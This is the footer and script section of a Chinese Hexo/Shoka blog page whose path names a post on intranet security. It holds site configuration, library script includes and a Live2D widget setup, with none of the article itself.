    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/12/30/SAFE/11 内网安全/',
    favicon: {
      show: "Cryp71c3",
      hide: "十年磨一剑"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":140,"height":260},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
